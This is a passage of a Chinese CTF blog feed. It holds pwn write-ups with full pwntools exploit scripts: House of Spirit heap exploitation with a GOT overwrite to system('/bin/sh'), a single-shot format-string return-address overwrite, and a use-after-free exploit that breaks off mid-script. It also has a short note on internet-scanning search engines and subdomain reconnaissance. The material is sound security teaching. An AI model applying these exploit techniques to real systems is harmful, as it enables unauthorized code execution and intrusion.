*是4个字节，申请的chunk总共才56个字节，而4*13&#x3D;52,所以他会把上一个chunk的指针存在现在的chunk的末尾位置</p><p>接下来是把name存在dword_804A288+25的位置，把description存在dword_804A288位置，可以轻易推出name的最大值应该只有27个字节，description的最大值应该是25个字节，但是fgets的字节是56个，可以看到这里存在堆溢出</p><p>最后是在dword_804A2A4的地方进行技术操作</p><p>这个函数的特殊在于他没有利用结构体进行操作，可以根据偏移来，这为我们利用它提供了空间</p><h4 id="校验-sub-80485EC-函数"><a href="#校验-sub-80485EC-函数" class="headerlink" title="校验(sub_80485EC)函数"></a>校验(sub_80485EC)函数</h4><p><img src="/img/Spirit/b"></p><p>这个函数是一个字节的校验函数，这里基本每一个fgets后面都有</p><h3 id="show-sub-8048729-函数"><a href="#show-sub-8048729-函数" class="headerlink" title="show(sub_8048729)函数"></a>show(sub_8048729)函数</h3><p><img src="/img/Spirit/c"></p><p>这是一个打印函数。为了打印所有已创建的chunk的内容，而块与块之间的联系就是靠存他们末尾的指针实现的</p><h3 id="free-sub-8048810-函数"><a href="#free-sub-8048810-函数" class="headerlink" title="free(sub_8048810)函数"></a>free(sub_8048810)函数</h3><p><img src="/img/Spirit/d"></p><p>这个函数也很简单，它通过循环把所有的chunk全部释放掉</p><h3 id="message-sub-80487B4-函数"><a href="#message-sub-80487B4-函数" class="headerlink" title="message(sub_80487B4)函数"></a>message(sub_80487B4)函数</h3><p><img src="/img/Spirit/e"></p><p>这个函数可以在dword_804A2A8存有的指针指向的区域写入128个字节的数据</p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><h5 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h5><p>在上面的分析中我们知道，show函数是根据每一个chunk的数据域中的chunk指针实现打印的，而add函数的溢出漏洞是可以让我们把其中的chunk指针覆盖成got表地址的，被覆盖之后再执行show函数的话，不久可以泄露出libc了吗</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">27</span>+p32(oreo.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>add(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">25</span>,payload)<br>show_rifle()<br>real=u32(io.recvuntil(<span class="hljs-string">&quot;\xf7&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))<br>base=real-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>log.success(<span class="hljs-string">&#x27;libc_base:&#x27;</span>+<span class="hljs-built_in">hex</span>(base))<br></code></pre></td></tr></table></figure><p><img src="/img/Spirit/f"></p><p>那么接下来就要想办法修改got表了</p><h5 id="修改got表"><a href="#修改got表" class="headerlink" title="修改got表"></a>修改got表</h5><p>问题就在这，我们可以通过什么方式来伪造呢？前面我们知道message函数可以往dword_804A2A8中的指针指向的区域写入数据的</p><p><img src="/img/Spirit/g"></p><p><img src="/img/Spirit/h"></p><p>可以看到dword_804A2A8存的指针是0x804a2c0</p><p><img src="/img/Spirit/i"></p><p>也就是这个地方数据我们是可以控制的，那么我们如果可以伪造一个chunk，并把它挂进fastbin,那么当我们再一次申请合适的chunk的时候就可以对这个fake_chunk进行操作了，这就是我们今天技术的核心，House Of Spirit</p><h6 id="伪造fake-chunk"><a href="#伪造fake-chunk" class="headerlink" title="伪造fake_chunk"></a>伪造fake_chunk</h6><p>因为add函数申请的chunk的大小是0x38,那我们就在0x804a2a0处，伪造一个0x40大小的fake_chunk，那么那处计数的地址我们可以申请40个chunk来让它成为fake_chunk的size域</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">i=<span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> i&lt;<span class="hljs-number">0x3f</span>:<br>add(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">27</span>,<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">25</span>)<br>i+=<span class="hljs-number">1</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">27</span>+p32(<span class="hljs-number">0x0804A2A8</span>)<br>add(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">27</span>,payload)<br>payload=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x20</span>+p32(<span class="hljs-number">0x40</span>)+p32(<span class="hljs-number">0x10</span>)<br>message(payload)<br>order()<br></code></pre></td></tr></table></figure><p>在伪造的时候，我们要注意一些细节来绕过检查</p><p>首先的就是<strong>地址需要对齐</strong></p><p>其二是fake_chunk的next chunk的大小不能小于2 * SIZE_SZ，也就是0x10</p><p>其三就是fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况</p><p>我个人认为早libc-2.23最重要的就这三个，wiki上的其他限制，在这道题我都试过，是没有影响的，当然我没有说wiki是错的，这可能是版本高一点加的新限制</p><p><img src="/img/Spirit/j"></p><p>可以看到我们是成功把fake_chunk挂进了fastbin</p><h6 id="修改got表-1"><a href="#修改got表-1" class="headerlink" title="修改got表"></a>修改got表</h6><p>那么我们再一次申请chunk，就可以对它操作，如果把原本dword_804A2A8存的指针改成strlen的got表，那么我们调用message函数的时候就是再改变strlen的got表的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=p32(oreo.got[<span class="hljs-string">&#x27;strlen&#x27;</span>])<br>payload=payload.ljust(<span class="hljs-number">25</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(payload,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">27</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/Spirit/k"></p><p>此时调用message函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=p32(system)+<span class="hljs-string">b&#x27;;/bin/sh\x00&#x27;</span><br>message(payload)<br></code></pre></td></tr></table></figure><p><img src="/img/Spirit/l"></p><p>可以看到此时got表修改成功</p><p><img src="/img/Spirit/m"></p><p><img src="/img/Spirit/n"></p><p>这里面存在strlen(dword_804A2A8),这也是上面的代码中为什么&#x2F;bin&#x2F;sh接在后面的原因，而dword_804A2A8第一个元素是p32(system),所以要用分号来继续执行指令</p><h5 id="最终exp"><a href="#最终exp" class="headerlink" title="最终exp"></a>最终exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">if</span> args[<span class="hljs-string">&#x27;DEBUG&#x27;</span>]:<br>    context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>oreo = ELF(<span class="hljs-string">&quot;./oreo&quot;</span>)<br><span class="hljs-keyword">if</span> args[<span class="hljs-string">&#x27;REMOTE&#x27;</span>]:<br>    hollk = remote(ip, port)<br><span class="hljs-keyword">else</span>:<br>    io = process(<span class="hljs-string">&quot;./oreo&quot;</span>)<br>log.info(<span class="hljs-string">&#x27;PID: &#x27;</span> + <span class="hljs-built_in">str</span>(proc.pidof(io)[<span class="hljs-number">0</span>]))<br>libc = ELF(<span class="hljs-string">&#x27;/home/joker/glibc-all-in-one/libs/2.23-0ubuntu3_i386/libc-2.23.so&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">descrip, name</span>):<br>    io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    io.sendline(name)<br>    io.sendline(descrip)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show_rifle</span>():<br>    io.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;===================================\n&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">order</span>():<br>    io.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">message</span>(<span class="hljs-params">notice</span>):<br>    io.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>    io.sendline(notice)<br><br><span class="hljs-comment">#libc</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">27</span>+p32(oreo.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>add(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">25</span>,payload)<br>show_rifle()<br>real=u32(io.recvuntil(<span class="hljs-string">&quot;\xf7&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))<br>base=real-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>log.success(<span class="hljs-string">&#x27;libc_base:&#x27;</span>+<span class="hljs-built_in">hex</span>(base))<br>system=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>i=<span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> i&lt;<span class="hljs-number">0x3f</span>:<br>add(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">27</span>,<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">25</span>)<br>i+=<span class="hljs-number">1</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">27</span>+p32(<span class="hljs-number">0x0804A2A8</span>)<br>add(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">27</span>,payload)<br>payload=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x20</span>+p32(<span class="hljs-number">0x40</span>)+p32(<span class="hljs-number">0x10</span>)<br>message(payload)<br>order()<br>payload=p32(oreo.got[<span class="hljs-string">&#x27;strlen&#x27;</span>])<br>payload=payload.ljust(<span class="hljs-number">25</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(payload,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">27</span>)<br><span class="hljs-comment">#payload=p32(system)+b&#x27;;sh\x00&#x27;</span><br>payload=p32(system)+<span class="hljs-string">b&#x27;;/bin/sh\x00&#x27;</span><br>message(payload)<br><span class="hljs-comment">#gdb.attach(io)</span><br>io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 堆利用 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原创 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>one_chance_格式化字符串</title>
      <link href="/2024/10/02/onechance-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
      <url>/2024/10/02/onechance-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
      
        <content type="html"><![CDATA[<h1 id="one-chance-格式化字符串漏洞"><a href="#one-chance-格式化字符串漏洞" class="headerlink" title="one_chance_格式化字符串漏洞"></a>one_chance_格式化字符串漏洞</h1><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>题目是Moectf_One chance</p><p><img src="/img/onechance_fmt/a.png"></p><p>可以看到程序中存在格式化字符串漏洞，但是只给了一次输入的机会的机会</p><p><img src="/img/onechance_fmt/b.png"></p><p><img src="/img/onechance_fmt/c.png"></p><p>但是给了后门地址0x1208</p><h3 id="错误思路"><a href="#错误思路" class="headerlink" title="错误思路"></a>错误思路</h3><p>其实这个题的思路很明显，就是要我们想办法通过一次的输入，就把返回地址最后的字节覆盖成后面函数的</p><p>所以我一开始构造的payload是这样的</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">payload=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>((ret&amp;<span class="hljs-number">0</span>xffff))+<span class="hljs-string">&#x27;c%15$hn&#x27;</span>+<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-number">0</span><span class="hljs-built_in">x100008-</span>(ret&amp;<span class="hljs-number">0</span>xffff))+<span class="hljs-string">&#x27;c%45$hhn&#x27;</span><br></code></pre></td></tr></table></figure><p>这里解释一下后面为什么是0x100008-(ret&amp;0xffff)</p><p>格式化字符串任意地址写的时候，后面写入的字符量一定要比前面的大。假设有 <code>%30c%16$hhn%40c%26$hhn</code> ，这样写到栈顶偏移 <code>20</code> 的位置，写入的值是 <code>70</code> （<code>30+40</code> ，并非是 <code>40</code>）</p><p>按理来说这样一个payload就能打通</p><p><img src="/img/onechance_fmt/d.png"></p><p><img src="/img/onechance_fmt/e.png"></p><p>但是我们发现上面的payload只有一半生效</p><p><img src="/img/onechance_fmt/f.png"></p><p><img src="/img/onechance_fmt/g.png"></p><p>仅仅将链栈指向了返回地址，返回地址的值并没有改变</p><p>我也不知道为啥</p><p>有博主猜测是这样的</p><p>猜测：任意地址写用 <code>$</code> 指定写入和按参数顺序写入的操作是先后分开的，先按参数顺序写入指针后，再用 <code>$</code> 去在刚刚的指针基础上进行修改。<strong>注意：这仅仅是个猜测，真相应该去源码中找到答案</strong> </p><p>因此我们只能找其他方法利用</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>不能用$指定位置，那就只能按顺序来了，所以我后面的payload如下</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">payload=<span class="hljs-string">&#x27;%p&#x27;</span>*<span class="hljs-number">13</span>+<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>((ret&amp;<span class="hljs-number">0</span>xffff)-<span class="hljs-number">138</span>)+<span class="hljs-string">&#x27;c%hn&#x27;</span>+<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-number">0</span><span class="hljs-built_in">x100008-</span>(ret&amp;<span class="hljs-number">0</span>xffff))+<span class="hljs-string">&#x27;c%45$hhn&#x27;</span><br></code></pre></td></tr></table></figure><p>因为 <code>printf</code> 解析参数会根据 <code>%</code> 进行判断，在 <code>hn</code> 前面一共有 <code>15</code> 个 <code>%</code> ，所以这个 <code>%xxxc%hn</code> 会将 <code>xxx</code> 数据加上 <code>%p</code> 泄露的字符个数写入第十五个参数</p><p>至于-138的由来，%p泄露出来的字符个数一并算进去，这个只能考调试计算了，不同的libc版本都不同</p><p>后面就没啥了</p><p><img src="/img/onechance_fmt/h.png"></p><p>这次可以看到返回地址也更改成功了</p><h3 id="最终exp"><a href="#最终exp" class="headerlink" title="最终exp"></a>最终exp</h3><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-built_in">io</span>=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>#<span class="hljs-built_in">io</span>=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-string">&#x27;44471&#x27;</span>)<br>gdb.attach(<span class="hljs-built_in">io</span>)<br><span class="hljs-built_in">io</span>.recvuntil(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>stack=int(<span class="hljs-built_in">io</span>.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(hex(stack))<br>ret=stack+<span class="hljs-number">0x18</span><br>payload=<span class="hljs-string">&#x27;%p&#x27;</span>*<span class="hljs-number">13</span>+<span class="hljs-string">&#x27;%&#x27;</span>+str((ret&amp;<span class="hljs-number">0xffff</span>)<span class="hljs-number">-138</span>)+<span class="hljs-string">&#x27;c%hn&#x27;</span>+<span class="hljs-string">&#x27;%&#x27;</span>+str(<span class="hljs-number">0x100008</span>-(ret&amp;<span class="hljs-number">0xffff</span>))+<span class="hljs-string">&#x27;c%45$hhn&#x27;</span><br><span class="hljs-built_in">io</span>.send(payload)<br><span class="hljs-built_in">io</span>.interactive()<br>pause()<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 栈利用 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原创 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>与ZoomEye类似的搜索引擎</title>
      <link href="/2024/10/01/%E4%B8%8EZoomEye%E7%B1%BB%E4%BC%BC%E7%9A%84%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/"/>
      <url>/2024/10/01/%E4%B8%8EZoomEye%E7%B1%BB%E4%BC%BC%E7%9A%84%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/</url>
      
        <content type="html"><![CDATA[<h1 id="与ZoomEye类似的搜索引擎"><a href="#与ZoomEye类似的搜索引擎" class="headerlink" title="与ZoomEye类似的搜索引擎"></a>与ZoomEye类似的搜索引擎</h1><h3 id="ZoomEye"><a href="#ZoomEye" class="headerlink" title="ZoomEye"></a>ZoomEye</h3><p>ZoomEye是一个强大子域名搜索引擎，类似的搜索引擎还有</p><p>ZoomEye（中文名：钟馗之眼）是一款专注于网络设备和物联网设备搜索的搜索引擎。它提供了一种通过互联网上的设备进行搜索的方式，使用户能够发现和分析各种连接到互联网的设备，包括服务器、路由器、摄像头、数据库等。ZoomEye 主要用于网络侦查、漏洞发现和网络安全研究。</p><p>以下是 ZoomEye 的一些主要特点和功能：</p><p>设备搜索： ZoomEye 允许用户通过关键字、IP 地址、域名等进行设备搜索。用户可以使用不同的搜索条件来定位特定类型的设备。</p><p>图形化界面： ZoomEye 提供了图形化的用户界面，以便用户更直观地浏览和分析搜索结果。图谱和图形化视图有助于用户理解设备之间的关系。</p><p>漏洞检测： ZoomEye 可以帮助用户发现互联网上的设备中存在的潜在漏洞。它可以通过检查设备的服务、开放端口等信息来提供漏洞的线索。</p><p>定期扫描： ZoomEye 支持定期扫描，使用户能够跟踪设备和漏洞的变化。这有助于持续监视和评估网络的安全性。</p><p>API 支持： ZoomEye 提供 API，允许开发人员集成 ZoomEye 的功能到他们的应用程序中。这使得用户能够自动化搜索和信息收集的过程。</p><p>历史数据： ZoomEye 记录设备和漏洞的历史数据，用户可以查看过去的扫描结果，了解网络的发展和变化。</p><p>例如对域名的搜索</p><p>访问下列官网即可查询</p><p><a href="https://www.zoomeye.org/">首页 - 网络空间测绘,网络安全,漏洞分析,动态测绘,钟馗之眼,时空测绘,赛博测绘 - ZoomEye(“钟馗之眼”)网络空间搜索引擎</a></p><p>与ZoomEye还有很多</p><h3 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a><strong>Shodan</strong></h3><p>被誉为“<a href="https://so.csdn.net/so/search?q=%E7%89%A9%E8%81%94%E7%BD%91&spm=1001.2101.3001.7020">物联网</a>的搜索引擎”，专注于扫描和索引连接到互联网的各种设备，如智能家居设备、工业控制系统（ICS）、摄像头、数据库等</p><h3 id="Censys"><a href="#Censys" class="headerlink" title="Censys"></a>Censys</h3><p>提供全球互联网设备的可视化视图，帮助用户了解网络的整体安全状况 。</p><h3 id="BinaryEdge"><a href="#BinaryEdge" class="headerlink" title="BinaryEdge"></a>BinaryEdge</h3><p>提供全球互联网空间的监控和数据分析服务，通过持续扫描互联网，生成实时的安全情报和数据报表 。</p><h3 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h3><p>由白帽汇开发，功能全面，支持多种协议和服务的扫描与检索 。</p><h3 id="Onyphe"><a href="#Onyphe" class="headerlink" title="Onyphe"></a>Onyphe</h3><p>面向网络安全专业人士的数据搜索引擎，汇集了多个来源的数据，包括开放端口、漏洞、情报和暗网活动等 。</p><h3 id="Fofa"><a href="#Fofa" class="headerlink" title="Fofa"></a>Fofa</h3><p>网络空间搜索引擎，功能与ZoomEye类似，可以用于网络资产管理、漏洞扫描和威胁情报收集 。</p><p>360 网络空间资产测绘：提供网络资产的监控和分析 </p><h3 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h3><p>进行子域名收集的方法有：</p><p>搜索引擎：使用搜索引擎的高级搜索功能，如Google的site语法 site:example.com 。<br>证书透明度查询：通过查询证书透明度网站如crt.sh、Censys等来收集子域名 。<br>DNS记录查询：使用工具如nslookup查询域名的SRV、NS、MX、TXT等记录来收集子域名 。<br>自动化工具：如Subfinder、OneForAll、Layer子域名挖掘机等，这些工具通过多个API和字典枚举的方式自动化收集子域名 。<br>爬虫技术：通过编写爬虫程序爬取目标网站的所有页面、robots.txt文件、crossdomain.xml文件、sitemap文件等，从中筛选出子域名 </p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>我们来用ZoomEye查询学校的子域名</p><p><img src="/img/zoomeye.png"></p>]]></content>
      
      
      <categories>
          
          <category> 网络渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原创 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆利用_UAF</title>
      <link href="/2024/10/01/%E5%A0%86%E5%88%A9%E7%94%A8-UAF/"/>
      <url>/2024/10/01/%E5%A0%86%E5%88%A9%E7%94%A8-UAF/</url>
      
        <content type="html"><![CDATA[<h1 id="堆利用-UAF"><a href="#堆利用-UAF" class="headerlink" title="堆利用_UAF"></a>堆利用_UAF</h1><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>我们可以直接从字面上翻译它的意思：使用被释放的内存块。其实当一个内存块被释放之后重新使用有如下几种情况：</p><p>内存块被释放后，其对应的指针被设置为NULL，再次使用时程序会崩溃<br> 内存块被释放后，其对应的指针没有被设置为NULL，在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序有可能可以正常运转<br> 内存块被释放后，其对应的指针没有被设置为NULL，但是在下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能出现问题</p><p>具体的调试示例青参考下面这篇文章 这个作者还是讲的较为通俗易懂，同时这个知识也较为简单</p><p><a href="https://blog.csdn.net/qq_41202237/article/details/108797478">好好说话之Use After Free</a></p><p>接下来我会通过题目来讲解什么是UAF</p><h2 id="hitcon-training-hacknote"><a href="#hitcon-training-hacknote" class="headerlink" title="hitcon-training-hacknote"></a><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote">hitcon-training-hacknote</a></h2><p><img src="/img/UAF/a.png" alt="img"></p><p><img src="/img/UAF/b.png" alt="img"></p><p>函数名被我编辑过，大家可以用ida右键编辑方便自己记忆</p><h3 id="add-note函数"><a href="#add-note函数" class="headerlink" title="add_note函数"></a>add_note函数</h3><p><img src="/img/UAF/c.png" alt="img"></p><p><img src="/img/UAF/d.png" alt="img"></p><p>我们仔细分析一下函数的代码，这个函数是用来创建chunk的，并把chunk地址放到(notelist+4)中</p><p><img src="/img/UAF/e.png" alt="img"></p><p>而(notelist+i)用来存放printf_note_content函数地址</p><h3 id="delnote函数"><a href="#delnote函数" class="headerlink" title="delnote函数"></a>delnote函数</h3><p><img src="/img/UAF/f.png" alt="img"></p><p>这个函数是用来释放chunk的，但是我们发现它并没有释放chunk的指针，这为我们UAF创造了条件</p><h3 id="printf-note函数"><a href="#printf-note函数" class="headerlink" title="printf_note函数"></a>printf_note函数</h3><p><img src="/img/UAF/g.png" alt="img"></p><p>这个函数就是调用存在(notelist+i)里的print_note_content函数进行打印</p><h3 id="magic函数"><a href="#magic函数" class="headerlink" title="magic函数"></a>magic函数</h3><p><img src="/img/UAF/h.png" alt="img"></p><p><img src="/img/UAF/v.png" alt="img"></p><p>这是出题人给的后门函数 </p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>可以看到这个整个程序里面并没有堆溢出的地方</p><p>那么，我们先创建两个chunk来调试一下</p><p><img src="/img/UAF/i.png" alt="img"></p><p><img src="/img/UAF/j.png" alt="img"></p><p>可以看到两个chunk是通过各自的结构体chunk相连的，可以看到，每一个结构体的大小为0x10</p><p><img src="/img/UAF/k.png" alt="img"></p><p>这里面存的就是printf_note_content的地址</p><p>我们打印看看</p><p><img src="/img/UAF/l.png" alt="img"></p><p>可以看到是正常的</p><p>那么接下来再释放掉</p><p><img src="/img/UAF/m.png" alt="img"></p><p><img src="/img/UAF/n.png" alt="img"></p><p><img src="/img/UAF/o.png" alt="img"></p><p>可以看到chunk已经被free掉了，但是对应的指针还没有</p><p>那么我们是否可以把print_note_content函数的地址覆盖成magic函数，再来调用print_note函数来getflag呢？(有点绕，请仔细理解一下），答案是肯定的。</p><p>那么我们接下来的思路就是如何把print_note_content覆盖</p><h3 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h3><p>这个程序中并没有编辑函数来让我们修改</p><p>但是程序中的add_note函数是可以修改内容的</p><p><img src="/img/UAF/p.png" alt="img"></p><p>在free的时候，我们发现结构体同样也是被free的，这里面有两个0x10大小的free_chunk</p><p>设想一下，如果我们申请0x8大小的chunk，那么他的大小刚好等于0x10，申请的时候就不会从新分配空间，而是从fastbin里面取出来，那么我们就可以对其中有一个chunk进行编辑</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">size</span>=p32(pre_size)+p32(size)+<span class="hljs-number">0</span>x8=<span class="hljs-number">0</span>x10<br></code></pre></td></tr></table></figure><p> 代码如下</p><p><img src="/img/UAF/q.png" alt="img"></p><p> <img src="/img/UAF/r.png" alt="img"></p><p> <img src="/img/UAF/s.png" alt="img"></p><p> 可以看到此时print_note_content的位置已被magic函数替代</p><p> <img src="/img/UAF/t.png" alt="img"></p><p>而这个结构体对应的是chunk0</p><p>那么直接printf_note(0)即可getflag</p><p> <img src="/img/UAF/u.png" alt="img"></p><h3 id="完整的exp"><a href="#完整的exp" class="headerlink" title="完整的exp"></a>完整的exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>io=process(<span class="hljs-string">&#x27;./hacknote2&#x27;</span>)<br>gdb.attach(io)<br>shell=<span class="hljs-number">0x8048986</span><br>chunk=<span class="hljs-number">0x804a070</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>io.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>io.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>io.recvuntil(<span class="hljs-string">&quot;Note size :&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(size))<br>io.recvuntil(<span class="hljs-string">&quot;Content :&quot;</span>)<br>io.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">printf</span>(<span class="hljs-params">idx</span>):<br>io.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>io.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&quot;Index 